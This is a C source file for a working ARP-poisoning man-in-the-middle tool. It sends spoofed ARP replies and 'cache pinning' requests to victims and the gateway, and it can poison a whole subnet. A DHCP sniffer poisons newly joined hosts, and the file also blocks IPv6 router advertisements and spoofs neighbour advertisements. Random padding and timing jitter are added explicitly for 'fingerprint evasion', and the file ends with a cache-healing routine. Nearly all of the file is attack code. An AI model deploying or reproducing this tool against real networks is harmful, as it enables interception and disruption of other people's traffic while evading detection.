#include "arp_poison.h"
#include "arp_scan.h"
#include "ndp_block.h"
#include "utils_rate.h"
#include "utils_log.h"
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include "utils_discovery.h"

extern unsigned char *get_own_mac(void);
extern volatile sig_atomic_t g_shutdown_requested;

// --- Cached interface index: resolved once, not per-packet (#2) ---
static int g_cached_ifindex = -1;
static int g_consecutive_send_failures = 0;
#define MAX_CONSECUTIVE_FAILURES 50

static int resolve_ifindex(int sockfd) {
  struct ifreq if_idx;
  strcpy(if_idx.ifr_name, "eth0");
  if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    perror("SIOCGIFINDEX");
    return -1;
  }
  return if_idx.ifr_ifindex;
}

static int ensure_ifindex(int sockfd) {
  if (g_cached_ifindex == -1)
    g_cached_ifindex = resolve_ifindex(sockfd);
  return (g_cached_ifindex == -1) ? -1 : 0;
}

// --- Global state for burst callback ---
static struct Victim *g_poison_victims = NULL;
static int g_poison_victim_count = 0;
static unsigned char g_poison_gateway_ip[4];
static unsigned char g_poison_gateway_mac[6];
static unsigned char *g_poison_gateway_ipv6_ll = NULL;
static int g_poison_sockfd = -1;
static unsigned char *g_poison_my_mac = NULL;

// Aggressive burst with randomized timing (#7) and cache pinning (#6)
void execute_poison_burst(void) {
  if (g_poison_sockfd == -1 || !g_poison_victims) return;

  unsigned char broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  int burst_count = 3 + (rand() % 5); // 3-7 rounds (#7)
  log_printf("[BURST] Triggered! Sending %d-round burst...\n", burst_count);

  for (int b = 0; b < burst_count; b++) {
    // Broadcast: reaches all devices regardless of MAC
    send_arp_reply(g_poison_sockfd, broadcast_mac, g_poison_gateway_ip,
                   g_poison_my_mac, g_poison_gateway_ip);

    for (int i = 0; i < g_poison_victim_count; i++) {
      send_arp_reply(g_poison_sockfd, g_poison_victims[i].mac,
                     g_poison_victims[i].ip, g_poison_my_mac,
                     g_poison_gateway_ip);
      send_arp_reply(g_poison_sockfd, g_poison_gateway_mac,
                     g_poison_gateway_ip, g_poison_my_mac,
                     g_poison_victims[i].ip);
      // Cache pinning: unicast ARP Request forces victim to cache us (#6)
      send_arp_request(g_poison_sockfd, g_poison_victims[i].mac,
                       g_poison_victims[i].ip, g_poison_my_mac,
                       g_poison_gateway_ip);
    }

    if (g_poison_gateway_ipv6_ll) {
      send_ndp_ra_block(g_poison_sockfd, g_poison_my_mac,
                        g_poison_gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(g_poison_sockfd, all_nodes_mac, g_poison_my_mac,
                        g_poison_gateway_ipv6_ll);
    }

    usleep(5000 + (rand() % 16000)); // 5-20ms jitter (#7)
  }
}

// Optimized ARP Reply: stack buffer (#2), error tracking (#3), random padding (#8)
int send_arp_reply(int sockfd, unsigned char *target_mac,
                   unsigned char *target_ip, unsigned char *spoofed_mac,
                   unsigned char *spoofed_ip) {
  if (ensure_ifindex(sockfd) < 0) return -1;

  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_ifindex = g_cached_ifindex;
  sa.sll_halen = ETH_ALEN;
  memcpy(sa.sll_addr, target_mac, 6);

  // Stack buffer with room for random padding (#2, #8)
  unsigned char buffer[80];
  int base_len = sizeof(struct ethhdr) + 28;
  int padding = rand() % 19; // 0-18 bytes of random padding (#8)
  int total_len = base_len + padding;
  memset(buffer, 0, total_len);

  // Random padding bytes for fingerprint evasion (#8)
  for (int i = base_len; i < total_len; i++)
    buffer[i] = rand() & 0xFF;

  // Ethernet header
  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, spoofed_mac, 6);
  memcpy(eth->h_dest, target_mac, 6);
  eth->h_proto = htons(ETH_P_ARP);

  // ARP payload
  *(uint16_t *)(buffer + 14) = htons(1);          // HW type
  *(uint16_t *)(buffer + 16) = htons(ETH_P_IP);   // Proto type
  buffer[18] = 6; buffer[19] = 4;                  // HW/Proto len
  *(uint16_t *)(buffer + 20) = htons(2);           // Opcode: Reply
  memcpy(buffer + 22, spoofed_mac, 6);
  memcpy(buffer + 28, spoofed_ip, 4);
  memcpy(buffer + 32, target_mac, 6);
  memcpy(buffer + 38, target_ip, 4);

  // Send with consecutive failure tracking (#3)
  if (sendto(sockfd, buffer, total_len, 0,
             (struct sockaddr *)&sa, sizeof(sa)) < 0) {
    g_consecutive_send_failures++;
    if (g_consecutive_send_failures == 1 ||
        g_consecutive_send_failures % 10 == 0) {
      log_printf("[!] sendto failed (%d consecutive)\n",
                 g_consecutive_send_failures);
    }
    if (g_consecutive_send_failures >= MAX_CONSECUTIVE_FAILURES) {
      log_printf("[!] %d failures — forcing ifindex re-resolve\n",
                 MAX_CONSECUTIVE_FAILURES);
      g_cached_ifindex = -1;
      g_consecutive_send_failures = 0;
    }
    return -1;
  }
  g_consecutive_send_failures = 0;
  return 0;
}

// Unicast ARP Request for cache pinning (#6)
// Victim processes sender MAC+IP and caches it, strengthening the spoof
int send_arp_request(int sockfd, unsigned char *target_mac,
                     unsigned char *target_ip, unsigned char *sender_mac,
                     unsigned char *sender_ip) {
  if (ensure_ifindex(sockfd) < 0) return -1;

  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_ifindex = g_cached_ifindex;
  sa.sll_halen = ETH_ALEN;
  memcpy(sa.sll_addr, target_mac, 6);

  unsigned char buffer[64];
  int frame_len = sizeof(struct ethhdr) + 28;
  memset(buffer, 0, frame_len);

  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, sender_mac, 6);
  memcpy(eth->h_dest, target_mac, 6);
  eth->h_proto = htons(ETH_P_ARP);

  *(uint16_t *)(buffer + 14) = htons(1);
  *(uint16_t *)(buffer + 16) = htons(ETH_P_IP);
  buffer[18] = 6; buffer[19] = 4;
  *(uint16_t *)(buffer + 20) = htons(1); // Opcode: REQUEST
  memcpy(buffer + 22, sender_mac, 6);    // Sender MAC = ours
  memcpy(buffer + 28, sender_ip, 4);     // Sender IP = gateway (spoofed)
  memset(buffer + 32, 0x00, 6);          // Target MAC = unknown
  memcpy(buffer + 38, target_ip, 4);     // Target IP = victim

  if (sendto(sockfd, buffer, frame_len, 0,
             (struct sockaddr *)&sa, sizeof(sa)) < 0) {
    return -1;
  }
  return 0;
}

// --- Subnet-Wide Brute Force ---
void start_wide_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
                          unsigned char *gateway_ipv6_ll) {
  log_printf("Starting Subnet-Wide ARP poisoning (BRUTE FORCE)...\n");
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  unsigned char *my_ip = get_own_ip();
  unsigned char *netmask = get_netmask();

  if (!my_mac || !my_ip || !netmask) {
    fprintf(stderr, "Failed to get local network details for wide poisoning.\n");
    if (my_mac) free(my_mac);
    if (my_ip) free(my_ip);
    if (netmask) free(netmask);
    close(sockfd);
    return;
  }

  g_poison_sockfd = sockfd;
  g_poison_my_mac = my_mac;
  memcpy(g_poison_gateway_ip, gateway_ip, 4);
  memcpy(g_poison_gateway_mac, gateway_mac, 6);
  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;

  uint32_t ip_int = ntohl(*(uint32_t *)my_ip);
  uint32_t mask_int = ntohl(*(uint32_t *)netmask);
  uint32_t net_int = ip_int & mask_int;
  uint32_t bcast_int = net_int | ~mask_int;
  unsigned char broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  while (!g_shutdown_requested) {
    send_arp_reply(sockfd, broadcast_mac, (unsigned char *)&bcast_int,
                   my_mac, gateway_ip);

    for (uint32_t target = net_int + 1; target < bcast_int; target++) {
      uint32_t t_ip_h = htonl(target);
      if (memcmp(&t_ip_h, my_ip, 4) == 0 ||
          memcmp(&t_ip_h, gateway_ip, 4) == 0)
        continue;
      send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac,
                     (unsigned char *)&t_ip_h);
    }

    if (gateway_ipv6_ll) {
      send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
    }

    int sleep_sec = 1 + (rand() % 3); // 1-3s randomized (#7)
    log_printf("Wide-mode cycle complete. Sleeping %ds...\n", sleep_sec);
    sleep(sleep_sec);
  }

  free(my_mac);
  free(my_ip);
  free(netmask);
  close(sockfd);
}

// --- DHCP Smart Sniffer ---
void start_smart_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
                           unsigned char *gateway_ipv6_ll) {
  (void)gateway_ipv6_ll;
  log_printf("Starting Event-Driven ARP poisoning (DHCP SNIFFER)...\n");
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  if (!my_mac) { close(sockfd); return; }

  int arp_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (arp_sockfd == -1) {
    perror("arp socket");
    free(my_mac);
    close(sockfd);
    return;
  }

  // Set recv timeout so we can check g_shutdown_requested
  struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

  uint8_t buffer[2048];
  while (!g_shutdown_requested) {
    int bytes = recv(sockfd, buffer, sizeof(buffer), 0);
    if (bytes < (int)(14 + 20 + 8 + 240)) continue;

    uint16_t src_port = ntohs(*(uint16_t *)(buffer + 34));
    uint16_t dst_port = ntohs(*(uint16_t *)(buffer + 36));

    if (dst_port == 68 || src_port == 67) {
      struct dhcp_packet *dhcp = (struct dhcp_packet *)(buffer + 14 + 20 + 8);
      uint8_t *opt = dhcp->options;
      int found_type = -1;

      for (int i = 0; i < 308 - 2; i++) {
        if (opt[i] == 53 && opt[i+1] == 1) { found_type = opt[i+2]; break; }
        if (opt[i] == 255) break;
      }

      if (found_type == 5 || found_type == 3) {
        unsigned char victim_ip[4] = {0};
        if (found_type == 5) {
          memcpy(victim_ip, &dhcp->yiaddr, 4);
        } else {
          for (int i = 0; i < 308 - 5; i++) {
            if (opt[i] == 50 && opt[i+1] == 4) {
              memcpy(victim_ip, &opt[i+2], 4);
              break;
            }
          }
        }

        if (victim_ip[0] != 0) {
          log_printf("[SMART] DHCP Event! New Victim: %d.%d.%d.%d\n",
                     victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);

          int burst = 3 + (rand() % 5); // Randomized (#7)
          for (int b = 0; b < burst; b++) {
            send_arp_reply(arp_sockfd, dhcp->chaddr, victim_ip,
                           my_mac, gateway_ip);
            send_arp_reply(arp_sockfd, gateway_mac, gateway_ip,
                           my_mac, victim_ip);
            send_arp_request(arp_sockfd, dhcp->chaddr, victim_ip,
                             my_mac, gateway_ip); // Cache pin (#6)
            usleep(5000 + (rand() % 16000)); // Jitter (#7)
          }
        }
      }
    }
  }

  free(my_mac);
  close(arp_sockfd);
  close(sockfd);
}

// --- Lightweight MAC refresh from /proc/net/arp (#4) ---
// Zero-cost: no sockets, no blocking. Reads the kernel's ARP cache.
static void refresh_victim_mac(struct Victim *victim) {
  FILE *f = fopen("/proc/net/arp", "r");
  if (!f) return;

  char line[256];
  fgets(line, sizeof(line), f); // Skip header

  char target_ip_str[INET_ADDRSTRLEN];
  snprintf(target_ip_str, sizeof(target_ip_str), "%d.%d.%d.%d",
           victim->ip[0], victim->ip[1], victim->ip[2], victim->ip[3]);

  while (fgets(line, sizeof(line), f)) {
    char ip[64], mac_str[64], hw[64], dev[64];
    int type, flags;
    if (sscanf(line, "%s 0x%x 0x%x %17s %s %s",
               ip, &type, &flags, mac_str, hw, dev) >= 4) {
      if (strcmp(ip, target_ip_str) == 0 && (flags & 0x2)) {
        unsigned char new_mac[6];
        if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &new_mac[0], &new_mac[1], &new_mac[2],
                   &new_mac[3], &new_mac[4], &new_mac[5]) == 6) {
          if (memcmp(new_mac, victim->mac, 6) != 0) {
            log_printf("[REFRESH] Victim %s MAC changed: "
                   "%02x:%02x:%02x:%02x:%02x:%02x -> "
                   "%02x:%02x:%02x:%02x:%02x:%02x\n",
                   target_ip_str,
                   victim->mac[0], victim->mac[1], victim->mac[2],
                   victim->mac[3], victim->mac[4], victim->mac[5],
                   new_mac[0], new_mac[1], new_mac[2],
                   new_mac[3], new_mac[4], new_mac[5]);
            memcpy(victim->mac, new_mac, 6);
          }
        }
        break;
      }
    }
  }
  fclose(f);
}

#define MAC_REFRESH_CYCLES 60

// --- Main Poisoning Loop ---
void start_poisoning(struct Victim *victims, int victim_count,
                     unsigned char *gateway_ip, unsigned char *gateway_mac,
                     unsigned char *gateway_ipv6_ll) {
  log_printf("Starting ARP poisoning loop for %d victims...\n", victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  if (!my_mac) {
    fprintf(stderr, "Failed to get own MAC for poisoning.\n");
    close(sockfd);
    return;
  }

  // Setup burst callback globals
  g_poison_victims = victims;
  g_poison_victim_count = victim_count;
  memcpy(g_poison_gateway_ip, gateway_ip, 4);
  memcpy(g_poison_gateway_mac, gateway_mac, 6);
  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;
  g_poison_sockfd = sockfd;
  g_poison_my_mac = my_mac;

  srand(time(NULL)); // Seed RNG for randomized timing (#7)

  set_burst_callback(execute_poison_burst);
  init_rate_monitor(gateway_mac, gateway_ip, gateway_ipv6_ll, my_mac);

  unsigned char broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  int cycle_count = 0;

  while (!g_shutdown_requested) {
    // Periodic MAC refresh from kernel cache (#4)
    cycle_count++;
    if (cycle_count >= MAC_REFRESH_CYCLES) {
      cycle_count = 0;
      for (int i = 0; i < victim_count; i++)
        refresh_victim_mac(&victims[i]);
    }

    // Broadcast: "I am the Gateway"
    send_arp_reply(sockfd, broadcast_mac, gateway_ip, my_mac, gateway_ip);

    for (int i = 0; i < victim_count; i++) {
      // Unicast Reply to Victim
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, my_mac,
                     gateway_ip);
      // Tell Gateway: "I am Victim"
      send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, victims[i].ip);
      // Cache pinning via ARP Request (#6)
      send_arp_request(sockfd, victims[i].mac, victims[i].ip, my_mac,
                       gateway_ip);
    }

    // Block IPv6
    if (gateway_ipv6_ll) {
      send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
    }

    float interval = get_adaptive_interval();
    // Add small jitter to interval (#7)
    float jitter = ((rand() % 201) - 100) / 1000.0f; // ±0.1s
    float sleep_time = interval + jitter;
    if (sleep_time < 0.2f) sleep_time = 0.2f;
    log_printf("Poison sent. Sleeping %.1fs...\n", sleep_time);
    usleep((useconds_t)(sleep_time * 1000000));
  }

  stop_rate_monitor();
  free(my_mac);
  close(sockfd);
}

// --- ARP Healing (restore caches on exit) ---
void heal_arp(struct Victim *victims, int victim_count,
              unsigned char *gateway_ip, unsigned char *gateway_mac) {
  log_printf("\n[HEALING] Restoring ARP caches for %d Victims and Gateway...\n",
         victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  for (int j = 0; j < 3; j++) {
    for (int i = 0; i < victim_count; i++) {
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, gateway_mac,
                     gateway_ip);
      send_arp_reply(sockfd, gateway_mac, gateway_ip, victims[i].mac,
                     victims[i].ip);
    }
    usleep(500000);
  }

  close(sockfd);
  log_printf("[HEALING] ARP Caches successfully restored.\n");
}
